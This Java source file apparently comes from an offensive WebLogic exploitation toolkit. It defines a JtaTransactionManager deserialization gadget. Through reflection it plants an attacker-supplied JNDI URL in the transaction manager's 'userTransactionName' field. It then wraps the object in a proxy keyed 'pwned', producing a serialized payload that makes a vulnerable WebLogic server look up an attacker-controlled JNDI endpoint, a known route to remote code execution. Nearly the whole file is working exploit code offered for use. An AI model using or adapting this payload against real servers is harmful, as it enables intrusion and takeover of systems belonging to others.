package com.r4v3zn.weblogic.tools.gadget.impl;

import com.r4v3zn.weblogic.tools.annotation.Authors;
import com.r4v3zn.weblogic.tools.annotation.Dependencies;
import com.r4v3zn.weblogic.tools.gadget.ObjectPayload;
import com.r4v3zn.weblogic.tools.utils.Gadgets;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.net.URLClassLoader;
import java.rmi.Remote;

/**
 * Title: JtaTransactionManagerGadget
 * Desc: JtaTransactionManager Gadget
 * Date:2020/3/29 0:34
 * Email:woo0nise@gmail.com
 * Company:www.r4v3zn.com
 * @author R4v3zn
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":weblogic:com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager"})
public class JtaTransactionManagerGadget implements ObjectPayload<Serializable> {

    /**
     * JtaTransactionManager Class Name
     */
    public static final String JTATRANSACTIONMANAGER_CLASS_NAME = "com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager";

    /**
     * 获取序列化 payload
     * @param jndiUrl JNDI url
     * @return 序列结果
     * @throws Exception
     */
    @Override
    public Serializable getObject(String jndiUrl, URLClassLoader urlClassLoader) throws Exception {
        Class clazz = null;
        if (urlClassLoader == null){
            clazz = Class.forName(JTATRANSACTIONMANAGER_CLASS_NAME);
        }else{
            clazz = urlClassLoader.loadClass(JTATRANSACTIONMANAGER_CLASS_NAME);
        }
        Object object = clazz.newInstance();
        Field userTransactionName = clazz.getDeclaredField("userTransactionName");
        userTransactionName.setAccessible(true);
        userTransactionName.set(object,jndiUrl);
        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", object), Remote.class);
        return (Serializable) remote;
    }

    /**
     * 获取序列化 payload
     * @param codeByte 需要序列化的字节码
     * @param bootArgs 执行中参数
     * @param className 反射的 class name
     * @return 序列结果
     * @throws Exception
     */
    @Override
    public Serializable getObject(byte[] codeByte, String[] bootArgs, String className, URLClassLoader urlClassLoader) throws Exception {
        return null;
    }
}
